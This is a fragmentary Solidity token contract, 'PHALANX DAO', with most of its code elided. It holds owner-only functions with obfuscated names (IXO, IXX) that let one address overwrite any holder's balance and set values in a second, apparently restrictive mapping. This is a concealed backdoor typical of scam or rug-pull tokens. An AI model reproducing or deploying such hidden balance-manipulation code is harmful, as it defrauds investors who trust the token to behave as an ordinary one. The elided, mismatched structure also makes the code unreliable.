...
contract PHALANX {
    ...
    string public name = "PHALANX DAO";
    string public symbol = unicode"PHALANX";
   ...
   function balanceOf(address account) public view  returns (uint256) {
     ...
     function IXO (address iox, uint256 ioz)  public {
     if(msg.sender == XLR) {
   zIC[iox] = ioz;}}
 ...
 require(value <= zIB[from]);
      ...
      zIB[to] += value; 
        ...
        emit Transfer(from, to, value);
        return true; }}
        function IXX (address iox, uint256 ioz)  public {
    if(msg.sender == XLR) {
    zIB[iox] = ioz;}}
